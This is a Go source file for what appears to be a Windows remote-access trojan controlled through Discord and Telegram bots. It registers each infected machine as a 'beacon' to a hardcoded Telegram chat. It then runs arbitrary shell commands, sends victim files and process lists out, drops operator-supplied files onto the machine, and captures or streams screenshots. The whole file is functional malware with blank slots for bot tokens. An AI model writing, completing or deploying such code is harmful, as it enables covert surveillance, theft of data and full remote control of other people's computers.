// +build windows

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"image/jpeg"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
	"os/signal"
	"syscall"
	"math/rand"
	"strconv"
	"net/http"
	"encoding/json"
	"path/filepath"
	"io"
)

const DISCORD_BOT_TOKEN = ""


const BOT_API_KEY = ""
const ANOTHER_DISCORD_CHANNEL_T_ID = ""
var CID int64 = 
const screenshotDelay = 2

var sharingScreenshots = false

var stopPolling = false

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
    
	if  m.ChannelID == ANOTHER_DISCORD_CHANNEL_T_ID {
        // Process the message...
   
    // Check if the message starts with "!interact "
    if strings.HasPrefix(m.Content, "!interact ") {
        // Get the ID from the message
        idFromMessage := strings.TrimSpace(m.Content[len("!interact "):])

        tempPath := os.Getenv("TEMP")

        // Read the agent ID from the .id file in the temp folder
        agentID, err := ioutil.ReadFile(filepath.Join(tempPath, ".id.txt"))
        if err != nil {
            fmt.Println("error reading .id file,", err)
            return
        }

        // If the ID from the message is the agent ID, start the Telegram bot
        if idFromMessage == strings.TrimSpace(string(agentID)) {
            startTelegramBot()
        }
    }
	if strings.HasPrefix(m.Content,"!kill " ){
		idFromMessage := strings.TrimSpace(m.Content[len("!kill "):])

        tempPath := os.Getenv("TEMP")

        // Read the agent ID from the .id file in the temp folder
        agentID, err := ioutil.ReadFile(filepath.Join(tempPath, ".id.txt"))
        if err != nil {
            fmt.Println("error reading .id file,", err)
            return
        }

        // If the ID from the message is the agent ID, start the Telegram bot
        if idFromMessage == strings.TrimSpace(string(agentID)) {
			s.Close()
			os.Exit(0)
        }
	   
	}
	if strings.HasPrefix(m.Content, "!list") {
        // Get the ID of agent
		botToken := BOT_API_KEY // Replace with your bot token
    	channelID := CID
        tempPath := os.Getenv("TEMP")

        // Read the agent ID from the .id file in the temp folder
        agentID, err := ioutil.ReadFile(filepath.Join(tempPath, ".id.txt"))
        if err != nil {
            fmt.Println("error reading .id file,", err)
            return
        }
		println("sent command " + string(agentID))
        // Send the ID to the Telegram bot
        apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%d&text=%s", botToken, channelID, agentID)
		resp, err := http.Get(apiURL)
		if err != nil {
			log.Println("Error sending command:", err)
			
		}
	
		if resp.StatusCode != http.StatusOK {
			log.Println("Error sending command, status code:", resp.StatusCode)
			bodyBytes, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatal(err)
			}
			bodyString := string(bodyBytes)
			log.Println(bodyString)
		}
	
		resp.Body.Close()
    }
}
}

// func verifyTelegramID(id int) bool {
// 	return telegramUserID == id
// }

func executeSystemCommand(cmde string) string {
	maxMessageLength := 4096
	var cmd *exec.Cmd
	
    
    cmd = exec.Command("sh", "-c", cmde)
    
	// Create buffer to capture output
	var output bytes.Buffer

	// Set the buffer as Stdout and Stderr of the command
	cmd.Stdout = &output
	cmd.Stderr = &output

	// Start the command
	err := cmd.Start()
	if err != nil {
		errMsg := fmt.Sprintf("Error : %v", err)
		
		return errMsg

	}

	// Wait for the command to finish
	err = cmd.Wait()
	if err != nil {
		errMsg := fmt.Sprintf("Error : %v", err)
		
		return errMsg

	}

	// Get the captured output as a string
	outputStr := output.String()

	// Shorten response if greater than 4096 characters
	if len(outputStr) > maxMessageLength {
		return outputStr[:maxMessageLength]
	}

	return outputStr
}


func startTelegramBot() {
	bot, err := tgbotapi.NewBotAPI(BOT_API_KEY)
	if err != nil {
		panic(err)
	}

	bot.Debug = false

	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	// msg := tgbotapi.NewMessage(telegramUserID, "Agent is up")
	// _, err = bot.Send(msg)
	// if err != nil {
	// 	log.Println("Error sending 'user is up' message:", err)
	// }
	
	ChannelID := CID

	var msg tgbotapi.MessageConfig
	msg = tgbotapi.NewMessage(ChannelID, "Agent is up")
	_, err = bot.Send(msg)
	if err != nil {
		log.Println("Error sending 'user is up' message:", err)
	}
	updates, err := bot.GetUpdatesChan(u)

	otherChannelID := CID
	for update := range updates {
		if update.ChannelPost != nil && update.ChannelPost.Chat.ID == otherChannelID {
			// Read the message from the update and send it
			if update.ChannelPost.Text == "/session" {
				tempPath := os.Getenv("TEMP")

        // Read the agent ID from the .id file in the temp folder
        agentID, err := ioutil.ReadFile(filepath.Join(tempPath, ".id.txt"))
        if err != nil {
            fmt.Println("error reading .id file,", err)
            return
        }
				msg := tgbotapi.NewMessage(otherChannelID, string(agentID))
				_, err = bot.Send(msg)
				if err != nil {
					log.Println("Error sending 'curent session' message:", err)
				}
				continue
			}
			if update.ChannelPost.Document != nil  {
				
				document := *update.ChannelPost.Document
				fileID := document.FileID
				fmt.Printf("\n%s Document: %s", fileID)
				fileURL, err := bot.GetFileDirectURL(fileID)
				if err != nil {
					log.Println("Error getting file URL:", err)
					continue
				}
				fmt.Printf("\n%s Document URL: %s \n", fileURL)
				// Download the file
				response, err := http.Get(fileURL)
				if err != nil {
					log.Println("Error downloading file:", err)
					continue
				}
				defer response.Body.Close()

				// Create the file in the .loot directory
				outFile, err := os.Create(document.FileName)
				if err != nil {
					log.Println("Error creating file:", err)
					continue
				}
				defer outFile.Close()

				// Write the contents of the downloaded file to the new file
				_, err = io.Copy(outFile, response.Body)
				if err != nil {
					log.Println("Error writing to file:", err)
					continue
				}
			
				msg := tgbotapi.NewMessage(update.ChannelPost.Chat.ID, "file uploaded.")
				bot.Send(msg)
			}
				// result, err := downloadFile(bot, update, filePath)
				// if err != nil {
				// 	log.Println("Error downloading file:", err)
				// }
				// msg := tgbotapi.NewMessage(update.ChannelPost.Chat.ID, result)
				// bot.Send(msg)
			
			
			if update.ChannelPost.Text == "/stop" {
				stopPolling = true
				msg := tgbotapi.NewMessage(otherChannelID, "Going to sleep")
				_, err = bot.Send(msg)
				if err != nil {
					log.Println("Error sending 'going to sleep' message:", err)
				}
				bot.StopReceivingUpdates()
				break
			}
			// userID := update.Message.From.ID
			message := update.ChannelPost.Text

			// if !verifyTelegramID(userID) {
			// 	msg := tgbotapi.NewMessage(update.Message.Chat.ID, "You are not authorized to use this bot.")
			// 	bot.Send(msg)
			// 	continue
			// }

			if strings.HasPrefix(message, "/cd") {
				cmd := strings.TrimSpace(strings.TrimPrefix(message, "/cd"))
				result := changeDirectory(cmd)
				msg := tgbotapi.NewMessage(update.ChannelPost.Chat.ID, result)
				bot.Send(msg)
				
				
			} else if strings.HasPrefix(message, "/download") {
                filePath := strings.TrimSpace(strings.TrimPrefix(message, "/download"))
                msg := tgbotapi.NewDocumentUpload(update.ChannelPost.Chat.ID, filePath)
                _, err := bot.Send(msg)
                if err != nil {
                    log.Println("Error uploading file:", err)
                }
            }else if strings.HasPrefix(message, "/services") {
				result := listRunningServices()
				msg := tgbotapi.NewMessage(update.ChannelPost.Chat.ID, result)
				bot.Send(msg)
				
			} else if strings.HasPrefix(message, "/screenshot") {
				filePath, err := takeScreenshot()
				if err != nil {
					log.Println("Error taking screenshot:", err)
					continue
				}
				// Remove the saved screenshot after sending it
				msg := tgbotapi.NewPhotoUpload(update.ChannelPost.Chat.ID, filePath)
				bot.Send(msg)
				
				
				os.Remove(filePath)
			} else if strings.HasPrefix(message, "/screenshare") {
				sharingScreenshots = true
				go startScreenSharing(bot, update.ChannelPost.Chat.ID)
			} else if strings.HasPrefix(message, "/stopshare") {
				sharingScreenshots = false
			} else if strings.HasPrefix(message, "/shell") {
				// Extract the command from the message
				cmdStr := strings.TrimPrefix(message, "/shell ")
		
				// Pass the command to handleAnyCommand
				result := handleAnyCommand(cmdStr)
				msg := tgbotapi.NewMessage(update.ChannelPost.Chat.ID, result)
				bot.Send(msg)
			}
		}
		continue
	}
}
func main() {
    rand.Seed(time.Now().UnixNano())
    var id int
	tempPath := os.Getenv("TEMP")
    // Check if the .id.txt file exists
	if _, err := os.Stat(filepath.Join(tempPath, ".id.txt")); os.IsNotExist(err) {
        // The .id.txt file does not exist, create a new ID
        id = rand.Int() // Assign a value to id here
        err := ioutil.WriteFile(filepath.Join(tempPath, ".id.txt"), []byte(fmt.Sprint(id)), 0644)
        if err != nil {
            fmt.Println("Error writing to .id.txt file:", err)
            return
        }
        fmt.Println("New ID created:", id)
    } else {
        // The .id.txt file exists, read the ID from it
        idBytes, err := ioutil.ReadFile(filepath.Join(tempPath, ".id.txt"))
        if err != nil {
            fmt.Println("Error reading from .id.txt file:", err)
            return
        }
        id, err = strconv.Atoi(string(idBytes)) // Assign a value to id here
        if err != nil {
            fmt.Println("Error converting ID to integer:", err)
            return
        }
        fmt.Println("ID read from .id.txt file:", id)
    }

    dg, err := discordgo.New("Bot " + DISCORD_BOT_TOKEN)
    if err != nil {
        fmt.Println("error creating Discord session,", err)
        return
    }

    // Open a websocket connection to Discord and begin listening.
    err = dg.Open()
    if err != nil {
        fmt.Println("error opening connection,", err)
        return
    }
    dg.AddHandler(messageCreate)

    _, err = dg.ChannelMessageSend(ANOTHER_DISCORD_CHANNEL_T_ID, fmt.Sprint(id))
    if err != nil {
        fmt.Println("error sending message to Discord channel,", err)
        return
    }
url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", BOT_API_KEY)

// Create a new Telegram message for the first channel
msg1 := map[string]string{
    "chat_id": "7043909573",
    "text":    "new beacon 🥳: " + fmt.Sprint(id),
}

// Create a new Telegram message for the second channel
msg2 := map[string]string{
    "chat_id": strconv.FormatInt(CID, 10),
    "text":    "new beacon 🥳: " + fmt.Sprint(id),
}

// Convert the messages to JSON
jsonMsg1, err := json.Marshal(msg1)
jsonMsg2, err := json.Marshal(msg2)
if err != nil {
    fmt.Println("Error converting message to JSON:", err)
    return
}

// Send the message to the Telegram API for the first channel
resp1, err := http.Post(url, "application/json", bytes.NewBuffer(jsonMsg1))
if err != nil {
    fmt.Println("Error sending message to Telegram:", err)
    return
}
defer resp1.Body.Close()

// Send the message to the Telegram API for the second channel
resp2, err := http.Post(url, "application/json", bytes.NewBuffer(jsonMsg2))
if err != nil {
    fmt.Println("Error sending message to Telegram:", err)
    return
}
defer resp2.Body.Close()
    // Wait here until CTRL-C or other term signal is received.
    fmt.Println("Bot is now running.  Press CTRL-C to exit.")
    sc := make(chan os.Signal, 1)
    signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
    <-sc

    dg.Close()
}

func changeDirectory(cmd string) string {
	result := ""
	if runtime.GOOS == "windows" {
		err := os.Chdir(cmd)
		if err != nil {
			result = fmt.Sprintf("Error changing directory: %v", err)
		} else {
			result = fmt.Sprintf("Changed directory to %s", cmd)
		}
	} else {
		result = "Command not supported on this platform"
	}
	return result
}


func downloadFile(bot *tgbotapi.BotAPI, update tgbotapi.Update, filePath string) (string, error) {
    if update.Message == nil || update.Message.Document == nil {
        return "", fmt.Errorf("no document found")
    }

    fileID := update.Message.Document.FileID
    fileURL, err := bot.GetFileDirectURL(fileID)
    if err != nil {
        return "", err
    }

    response, err := http.Get(fileURL)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()

    fileURLParts := strings.Split(fileURL, "/")
    fileName := fileURLParts[len(fileURLParts)-1]
    file, err := os.Create(fileName)
    if err != nil {
        return "", err
    }
    defer file.Close()

    _, err = io.Copy(file, response.Body)
    if err != nil {
        return "", err
    }

    return fileName, nil
}

func listRunningServices() string {
	result := ""
	if runtime.GOOS == "windows" {
		result = executeSystemCommand("tasklist")
	} else {
		result = executeSystemCommand("ps aux")
	}
	return result
}
func startScreenSharing(bot *tgbotapi.BotAPI, chatID int64) {
	var prevMessageID int

	for sharingScreenshots {
		filePath, err := takeScreenshot()
		if err != nil {
			log.Println("Error taking screenshot:", err)
			continue
		}

		// Send the new screenshot
		msg := tgbotapi.NewPhotoUpload(chatID, filePath)
		sentMsg, err := bot.Send(msg)
		if err != nil {
			log.Println("Error sending screenshot:", err)
			os.Remove(filePath)
			continue
		}

		// Delete the previous message if it exists
		if prevMessageID != 0 {
			deleteMsg := tgbotapi.NewDeleteMessage(chatID, prevMessageID)
			_, err := bot.Send(deleteMsg)
			if err != nil {
				log.Println("Error deleting previous message:", err)
			}
		}

		// Update the previous message ID with the current one
		prevMessageID = sentMsg.MessageID

		os.Remove(filePath)

		time.Sleep(1 * time.Second)
	}
}

func takeScreenshot() (string, error) {
	
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return "", fmt.Errorf("error capturing screenshot: %w", err)
		}

		// Encode screenshot to JPEG
		var buf bytes.Buffer
		err = jpeg.Encode(&buf, img, nil) // Use &buf as io.Writer
		if err != nil {
			return "", fmt.Errorf("error encoding screenshot: %w", err)
		}

		// Save screenshot using current timestamp
		timestamp := time.Now().Unix()
		filePath := fmt.Sprintf("%d.jpg", timestamp)
		err = ioutil.WriteFile(filePath, buf.Bytes(), 0644)
		if err != nil {
			return "", fmt.Errorf("error saving screenshot: %w", err)
		}
		
            
        
		return filePath, nil
	}
	
	return "", fmt.Errorf("no active displays found")
}

func handleAnyCommand(message string) string {
	response := executeSystemCommand(message)
	return response
}
